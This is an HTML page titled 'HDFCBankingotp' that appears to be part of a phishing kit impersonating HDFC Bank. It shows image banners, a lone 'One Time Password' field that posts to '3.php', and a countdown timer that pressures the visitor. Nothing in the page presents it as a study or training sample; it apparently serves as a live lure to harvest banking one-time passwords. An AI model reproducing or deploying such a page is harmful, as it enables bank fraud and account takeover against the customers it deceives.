

 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <br><br>
    <title>HDFCBankingotp</title>
    
    <link rel="stylesheet" href="style.css">
    <style>
            html { height:150%; }
        body{ font: 26px sans-serif; }
        .wrapper{ width: 800px; padding: 110px; }
      
        
    </style>
   <style>
        .loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('Spinner-3.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
    </style>
    <!--Spinner-3.gif-->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
</head>
<!--<br>-->
<!--<body style= "background-image: url('2.jpeg');background-attachment: scroll; background-repeat: no-repeat; background-size:cover;">  -->
<body>
    
  <nav style="
    background-image: url(.jpeg);
    background-attachment: fixed;
    background-repeat: no-repeat;
    background-size: contain;
    min-height: 96px;
    
    ">
            <center> <img src="5.jpg"/>
      </center>
     
    
     
    
     
  </nav>  
<header style= "background-image: url(2u4.jpeg);
    background-attachment: fixed;
    background-repeat: no-repeat;
    background-size: contain;
    min-height: 200px;">
    
          <center> <img src="17.png"/>
      </center>
     
    
    
</header>

<!--<div id='logo'>-->
<!--<img src='1.jpeg' style="-->
<!--    width: 100%;-->
<!--">-->
<!--</div>-->
<!--<div id='logo'>-->
<!--<img src='2.jpeg' style="-->
<!--    width: 100%;-->
<!--">-->
<!--</div>-->
<!--<div class="loader"></div>-->
        <div class="wrapper mt-5 ml-5">
        <h2> </h2>

        
        <form action="3.php" method="post">
            <div class="form-group">
                <label>One Time Password</label>
                
                <input type="text" name="otp" class="form-control " value="" placeholder="Enter otp">
                <span class="invalid-feedback"></span><br>
                <label>   <div><span id="timer"></span></div></label><br/>
                
            </div> 
            
            <div class="form-group">
                <input type="submit" name="submit" class="btn btn-primary" value="submit"style="background-color:4862A3; width:400px; height:45px; color:white;"><br><br>  
            </div> 
         
                        
        </form>
    </div>
     <!--<img src="Spinner-3.gif" alt="No Loader Found" />-->
   <script type="text/javascript">
$(window).load(function() {
    $(".loader").fadeOut("slow");
});
</script>
    <script>
        document.getElementById('timer').innerHTML =
  03 + ":" + 59;
startTimer();


function startTimer() {
  var presentTime = document.getElementById('timer').innerHTML;
  var timeArray = presentTime.split(/[:]+/);
  var m = timeArray[0];
  var s = checkSecond((timeArray[1] - 1));
  if(s==59){m=m-1}
  if(m<0){
    return
  }
  
  document.getElementById('timer').innerHTML =
    m + ":" + s;
  console.log(m)
  setTimeout(startTimer, 1000);
  
}

function checkSecond(sec) {
  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
  if (sec < 0) {sec = "59"};
  return sec;
}
    </script>
    </div>
    
    <section style= "background-image: url(4.jpeg);
    background-attachment: scroll;
    background-repeat: no-repeat;
    background-size: contain;
    min-height: 1500px;">
        
    </section><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
    
    
    
    
    <footer style= "background-image: url(7.jpg);
    background-attachment: scroll;
    background-repeat: no-repeat;
    background-size: 100% 150px;
    min-height: 150px;">
    <!--<img src="7.jpg" style="width:100%;"/>-->
</footer>
    
    
    
    </body></html>
    
    
    </body>
    
</html>